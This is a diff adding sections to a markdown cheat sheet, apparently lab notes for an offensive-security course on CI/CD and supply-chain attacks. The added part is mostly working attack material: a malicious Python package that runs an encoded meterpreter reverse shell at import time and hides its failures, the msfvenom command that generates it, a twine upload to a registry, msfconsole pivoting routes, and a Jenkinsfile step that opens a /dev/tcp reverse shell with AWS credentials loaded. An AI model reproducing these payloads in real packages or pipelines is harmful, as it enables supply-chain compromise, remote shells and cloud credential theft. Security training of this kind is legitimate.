@@ -93,3 +93,135 @@ aws configure set aws_session_token "<long-token-string>" --profile amethyst
 | `--profile amethyst` | Write to the `[amethyst]` section of `~/.aws/credentials` |
 
 **When you need this:** `aws configure` interactive mode now prompts for the session token directly (newer CLI versions). But if you're adding a token to an existing profile, or if the interactive flow confused the order, `set` lets you write the value directly without re-entering everything.
+
+---
+
+## Dependency Chain Abuse: Malicious Python Package Anatomy
+
+#DependencyConfusion #CICD #PythonPayload #Meterpreter
+
+```python
+# hackshort_util/utils.py — the payload file
+import time
+import sys
+
+def standardFunction():
+        pass
+
+def __getattr__(name):
+        pass
+        return standardFunction
+
+def catch_exception(exc_type, exc_value, tb):
+    while True:
+        time.sleep(1000)
+
+sys.excepthook = catch_exception
+
+exec(__import__('zlib').decompress(__import__('base64').b64decode(
+    __import__('codecs').getencoder('utf-8')('<base64-meterpreter>')[0])))
+```
+
+| Part | What it does |
+|------|-------------|
+| `def standardFunction()` | A no-op placeholder so `hackshort_util.utils.standardFunction()` succeeds silently if the app tries to call it after import |
+| `def __getattr__(name)` | Module-level wildcard: called whenever an attribute is accessed on the module that doesn't exist. Returns `standardFunction` for any call, so `utils.anything()` silently returns `None` without an `AttributeError`. This lets the production app continue loading even though our utils.py doesn't implement the real functions |
+| `def catch_exception(exc_type, exc_value, tb)` | A custom top-level exception handler: sleeps forever. Without this, any unhandled exception after import kills the process — and kills our meterpreter session along with it |
+| `sys.excepthook = catch_exception` | Replaces Python's default exception handler (which prints the traceback and exits) with our sleeping one. Now the process hangs instead of dying, giving us time to interact with the session |
+| `exec(...)` | Evaluates and runs the decoded meterpreter payload string at module import time. This is the moment the reverse shell connects back |
+| `__import__('zlib').decompress(...)` | Decompress the msfvenom-generated shellcode. msfvenom with `-f raw -p python/meterpreter/reverse_tcp` outputs a compressed+base64'd+UTF-8-encoded payload exactly in this format |
+
+**Why the `while True: time.sleep(1000)` works:** Python exceptions bubble up the call stack. If the except hook just returns, the interpreter exits. Blocking forever inside the hook keeps the interpreter (and our session) alive. `time.sleep(1000)` also avoids burning 100% CPU.
+
+---
+
+## `msfvenom -f raw -p python/meterpreter/reverse_tcp`
+
+```bash
+msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<ip> LPORT=4488
+```
+
+| Part | What it does |
+|------|-------------|
+| `-f raw` | Output format: `raw` for Python means print the payload as a bare Python `exec(...)` expression, not wrapped in any language-specific boilerplate. Contrast with `-f py` which adds a full Python script wrapper — `-f raw` gives just the exec line to paste |
+| `-p python/meterpreter/reverse_tcp` | The payload: a pure-Python meterpreter client. No compiled binary, no elf/pe file — the payload IS Python source, so it runs anywhere Python 3 is available (virtually every Linux container) |
+| `LHOST` | The IP the production container will try to connect BACK to. Must be your publicly-reachable IP (e.g., cloud Kali's public IP, NOT its 10.x.x.x internal address). The container is in AWS — it calls out to the internet, not to a RFC1918 address |
+| `LPORT=4488` | Must match an OPEN inbound port on your listener machine. AWS security groups block ports by default — only the pre-opened ports (e.g., 4488, 22) will receive the connection |
+
+**Common mistake:** running msfvenom on personal Kali and baking in the cloud Kali's internal `10.x.x.x` address as LHOST. The production container can't reach 10.x.x.x from AWS. Always use the cloud Kali's PUBLIC IP for LHOST.
+
+---
+
+## `twine upload --repository-url`
+
+```bash
+~/.local/bin/twine upload \
+  --repository-url http://pypi.offseclab.io/ \
+  -u student -p password \
+  dist/hackshort_util-1.1.4.tar.gz
+```
+
+| Part | What it does |
+|------|-------------|
+| `~/.local/bin/twine` | Full path — needed when twine was installed with `pip install --break-system-packages` and isn't on `$PATH` |
+| `--repository-url` | Override the upload target from PyPI (the default) to any URL. The private lab PyPI accepts standard twine uploads at this endpoint |
+| `-u student -p password` | Credentials for the private registry. These can also go in `~/.pypirc` to avoid typing them — but for one-off lab use, flags are fine |
+| `dist/hackshort_util-1.1.4.tar.gz` | **Specific filename, not `dist/*`.** If the directory contains old tarballs from previous sessions (with stale LHOST baked in), `dist/*` uploads them ALL. pip installs the highest version number regardless of upload order. A stale `1.1.6` tarball beats your fresh `1.1.4` |
+
+---
+
+## `route add` in msfconsole (session-based routing)
+
+```
+route add 172.30.0.0 255.255.0.0 <session_id>
+```
+
+| Part | What it does |
+|------|-------------|
+| `route add` | Tell MSF's internal routing table to forward packets to this network range through a meterpreter session instead of the local network stack |
+| `172.30.0.0 255.255.0.0` | Target network: the /16 subnet the meterpreter session has access to (its eth1 interface). All traffic destined for `172.30.x.x` gets tunnelled through the session |
+| `<session_id>` | The MSF session number. When the session dies and a new one opens, the old route goes stale — re-run `route add` with the new session ID. Use `sessions` to see current session numbers |
+
+**When combined with `auxiliary/server/socks_proxy`:** MSF SOCKS listens on `127.0.0.1:1080`. Any tool configured to use that SOCKS proxy (Firefox, proxychains, curl) has its traffic forwarded through the SOCKS listener → MSF route → meterpreter session → container → internal network. The SSH `-L` tunnel from personal Kali makes the cloud Kali's `127.0.0.1:1080` accessible locally.
+
+---
+
+## Jenkinsfile — `withAWS` + `sh` reverse shell
+
+```groovy
+withAWS(region: 'us-east-1', credentials: 'aws_key') {
+  script {
+    if (isUnix()) {
+      sh 'bash -c "bash -i >& /dev/tcp/<ip>/4242 0>&1" &'
+    }
+  }
+}
+```
+
+| Part | What it does |
+|------|-------------|
+| `withAWS(credentials: 'aws_key')` | Loads the Jenkins credential named `aws_key` as environment variables: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_DEFAULT_REGION`. Any command run inside this block inherits those env vars — including our reverse shell |
+| `script { ... }` | Allows Groovy and pipeline DSL features inside a `steps` block. Not strictly needed for `sh`, but enables `if (isUnix())` |
+| `if (isUnix())` | Groovy function (not sandboxed) that returns true when the build agent is Unix-based. Prevents the pipeline from crashing on a Windows agent — safe to include always |
+| `sh '...'` | Runs a command in the system shell (from the Nodes and Processes plugin, almost always installed). NOT sandboxed like the Groovy `script` block itself |
+| `bash -c "..."` | Wraps the payload in a new bash subprocess. Ensures redirections (`>&`, `0>&1`) work regardless of how Jenkins invokes the `sh` step |
+| `&` at the end | Sends the `bash -c` command to the background. Without this, the pipeline step would block waiting for the command to exit (which never happens for a reverse shell), and the pipeline would time out |
+
+**Why not write the payload directly in Groovy?** Groovy inside `script {}` runs in a Jenkins sandbox that restricts access to Java runtime APIs and filesystem operations. `sh` bypasses this by delegating to the OS shell, which has no sandbox.
+
+---
+
+## `git show <commit_hash>` — reading diff output for removed secrets
+
+```bash
+git show 643827653669...
+```
+
+| Part | What it does |
+|------|-------------|
+| `git show <hash>` | Displays the commit metadata (author, date, message) followed by the unified diff — lines prefixed with `-` were removed, `+` were added |
+| Lines starting with `-` | Content that was present BEFORE this commit — these are the deleted lines. A removed hardcoded credential shows here as a `-` line |
+| `Authorization: Basic <base64>` | HTTP Basic auth header format. The base64 value is `username:password` encoded with `echo -n "user:pass" \| base64`. Decode with `echo "<value>" \| base64 --decode` |
+| `git log` first | Always `git log` before `git show` to identify suspicious commit messages: "Fix issue" / "Remove creds" / "Hotfix" / "Clean up" are red flags worth inspecting |
+
+**Why gitleaks misses this:** gitleaks matches predefined regex patterns for known secret formats (AWS keys starting with `AKIA`, GitHub tokens `ghp_`, etc.). A custom Basic auth header with an org-specific credential doesn't match any pattern. Manual review catches what automated tools miss.
